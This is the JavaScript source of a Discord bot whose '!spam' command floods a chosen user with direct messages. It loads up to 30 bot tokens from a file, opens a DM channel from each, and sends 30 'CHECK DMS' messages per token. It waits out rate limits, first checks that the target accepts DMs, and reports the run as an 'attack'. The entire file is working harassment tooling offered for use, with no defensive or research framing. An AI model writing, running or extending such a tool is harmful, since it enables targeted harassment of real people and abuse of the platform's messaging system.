const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const cooldowns = new Map();
const activeAttacks = new Set();
let tokens = [];
let currentSession = '';

function loadTokens() {
    try {
        if (!fs.existsSync('tokens.txt')) {
            console.log('tokens.txt not found');
            return;
        }
        
        const data = fs.readFileSync('tokens.txt', 'utf8');
        tokens = data.split('\n')
            .map(t => t.trim())
            .filter(t => t.length > 30 && t.startsWith('MT') || t.startsWith('OT'));
        
        console.log(`Loaded ${tokens.length} valid tokens`);
    } catch (e) {
        console.log('Error loading tokens:', e.message);
        tokens = [];
    }
}

async function validateToken(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': `Bot ${token}` },
            timeout: 3000
        });
        return response.status === 200;
    } catch (e) {
        return false;
    }
}

async function createChannel(token, userId) {
    try {
        const isValid = await validateToken(token);
        if (!isValid) {
            throw new Error('Invalid token');
        }

        const response = await axios.post(
            'https://discord.com/api/v9/users/@me/channels',
            { recipients: [userId] },
            {
                headers: { 
                    'Authorization': `Bot ${token}`,
                    'Content-Type': 'application/json'
                },
                timeout: 5000,
                validateStatus: () => true
            }
        );

        if (response.status === 429) {
            const retryAfter = response.data?.retry_after || 2;
            await new Promise(r => setTimeout(r, retryAfter * 1000));
            return createChannel(token, userId);
        }

        if (response.status === 403) {
            throw new Error('No permission to create DM');
        }

        if (response.status === 400) {
            throw new Error('Invalid user ID');
        }

        return response.data?.id;
    } catch (e) {
        if (e.code === 'ECONNABORTED') {
            return null;
        }
        if (e.response?.status === 429) {
            const retryAfter = e.response.headers['retry-after'] || 5;
            await new Promise(r => setTimeout(r, retryAfter * 1000));
            return createChannel(token, userId);
        }
        return null;
    }
}

async function sendMessages(channelId, token, sessionId) {
    let sent = 0;
    
    for (let i = 0; i < 30; i++) {
        if (!activeAttacks.has(sessionId)) {
            throw new Error('Session stopped');
        }

        try {
            await axios.post(
                `https://discord.com/api/v9/channels/${channelId}/messages`,
                { content: "CHECK DMS" },
                {
                    headers: { 
                        'Authorization': `Bot ${token}`,
                        'Content-Type': 'application/json'
                    },
                    timeout: 3000,
                    validateStatus: () => true
                }
            );
            sent++;
            
            await new Promise(r => setTimeout(r, 60));
            
        } catch (e) {
            if (e.response?.status === 429) {
                const wait = e.response.data?.retry_after || 1;
                await new Promise(r => setTimeout(r, wait * 1000));
                i--;
                continue;
            }
            
            if (e.response?.status === 403 || e.response?.status === 404) {
                break;
            }
            
            if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
                await new Promise(r => setTimeout(r, 2000));
                continue;
            }
            
            break;
        }
    }
    
    return sent;
}

client.on('messageCreate', async message => {
    if (!message.content.startsWith('!') || message.author.bot) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'spam') {
        try {
            const now = Date.now();
            const cooldownKey = message.author.id;

            if (cooldowns.has(cooldownKey)) {
                const end = cooldowns.get(cooldownKey);
                if (now < end) {
                    const left = ((end - now) / 1000).toFixed(0);
                    return message.reply(`Wait ${left}s`);
                }
            }

            cooldowns.set(cooldownKey, now + 120000);
            setTimeout(() => cooldowns.delete(cooldownKey), 120000);

            const target = message.mentions.users.first();
            if (!target) {
                throw new Error('No user mentioned');
            }

            if (target.bot || target.id === message.author.id) {
                throw new Error('Invalid target');
            }

            try {
                await target.send('test');
                await target.send({ content: 'test' }).then(m => m.delete().catch(() => {}));
            } catch (e) {
                if (e.code === 50007) {
                    throw new Error('User has DMs disabled');
                }
                throw new Error('Cannot DM user');
            }

            currentSession = `${message.author.id}-${Date.now()}`;
            activeAttacks.add(currentSession);

            await message.reply(`Starting attack on ${target.tag}`);

            const allTokens = tokens.slice(0, 30);
            if (allTokens.length === 0) {
                throw new Error('No tokens available');
            }

            let totalSent = 0;
            let successfulTokens = 0;

            for (const token of allTokens) {
                if (!activeAttacks.has(currentSession)) {
                    throw new Error('Attack stopped');
                }

                try {
                    const channelId = await createChannel(token, target.id);
                    if (!channelId) continue;

                    const sent = await sendMessages(channelId, token, currentSession);
                    if (sent > 0) {
                        totalSent += sent;
                        successfulTokens++;
                    }
                } catch (e) {
                    continue;
                }
            }

            activeAttacks.delete(currentSession);
            
            await message.author.send(`Attack finished. ${successfulTokens}/${allTokens.length} tokens worked. Sent ${totalSent} messages`).catch(() => {});
            
            await message.reply(`Done. Sent ${totalSent} messages`);

        } catch (error) {
            activeAttacks.delete(currentSession);
            
            if (error.message === 'Attack stopped') {
                return message.reply('Attack stopped');
            }
            
            if (error.message === 'No tokens available') {
                return message.reply('No tokens loaded');
            }
            
            if (error.message === 'User has DMs disabled') {
                return message.reply('User has DMs disabled');
            }
            
            if (error.message === 'Invalid target') {
                return message.reply('Cannot target bots or yourself');
            }
            
            message.reply(`Error: ${error.message}`);
        }
    }

    if (command === 'stop') {
        activeAttacks.delete(currentSession);
        message.reply('Stopped current attack');
    }

    if (command === 'tokens') {
        message.reply(`Loaded ${tokens.length} tokens`);
    }

    if (command === 'reload') {
        loadTokens();
        message.reply(`Reloaded ${tokens.length} tokens`);
    }
});

client.on('error', (error) => {
    console.error('Client error:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled rejection:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

client.login('');
